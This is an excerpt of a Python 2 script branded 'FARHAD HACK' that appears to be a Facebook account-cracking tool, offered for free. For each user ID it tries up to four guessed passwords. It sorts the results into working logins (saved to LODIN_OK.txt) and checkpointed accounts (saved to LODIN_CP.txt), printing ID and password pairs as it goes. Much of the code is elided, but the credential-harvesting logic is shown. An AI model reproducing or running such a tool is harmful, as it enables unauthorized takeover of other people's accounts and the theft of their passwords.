...
os.system('git pull')
os.system('clear')
logo = '\n\n  ██████  ██   ██  ██████ ███    ██ \n  ██  ██  ██   ██  ██  ██ ██ █   ██  \n  ██████  ██   ██  ██████ ██  █  ██ \n  ██  ██  ██   ██  ██  ██ ██   █ ██  \n  ██  ██   █████   ██  ██ ██    ███         \n  alone lover        \n  walcome to FARHAD HACK        \n\n ------------------------------------------\n   \n   Author   : SHAHWAIZ AWAN\n   Github   : https://github.com/.....\n   Telegram : FARHAD...HACK🎭\n   Facebook : RAYEES FARHAD\n   Facebook Page : XXXXX\n   This tool is free . Not for sale\n   \n ------------------------------------------ '
...
def menu():
    ...
    try:
        ...
        print logo
        print ''
        print '\t Logged in id has LODIN_CP\x1b[0;97m'
        print ''
...
def a_s():
    ...
    print 47 * '-'
    print ''
    print '\t\x1b[1;32mCreated by: LODIN PROGRAMMER\x1b[0;97m'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[LODIN_OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/LODIN_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[LODIN_CP] ' + uid + ' | ' + pass1
                cp = open('LODIN_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[LODIN_OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/LODIN_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[LODIN_CP] ' + uid + ' | ' + pass2
                    cp = open('LODIN_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[LODIN_OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/LODIN_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[LODIN_CP] ' + uid + ' | ' + pass3
                        cp = open('LODIN_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[LODIN_OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/LODIN_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[LODIN_CP] ' + uid + ' | ' + pass4
                            cp = open('LODIN_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    print 47 * '-'
    print ''
    print '\tCreated by: LODIN PROGRAMMER'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '[LODIN_OK] ' + uid + ' | ' + pass1
                cp = open('LODIN_OK.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
